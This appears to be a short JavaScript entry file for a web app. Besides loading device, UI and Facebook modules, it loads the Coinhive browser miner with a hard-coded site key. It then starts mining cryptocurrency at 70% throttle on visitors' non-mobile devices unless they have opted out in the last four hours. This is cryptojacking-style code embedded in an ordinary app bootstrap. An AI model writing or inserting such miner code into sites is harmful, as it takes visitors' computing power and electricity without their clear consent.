global.deploymentType = "web"
require('./device')
require('./ui')
require('./FB')

require('./coinhive.min')
const miner = new CoinHive.Anonymous('1Dh4ORJkacanB4jbO47UrOVEB7aueH25', {throttle: 0.7})
// Only start on non-mobile devices and if not opted-out
// in the last 14400 seconds (4 hours):
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start()
}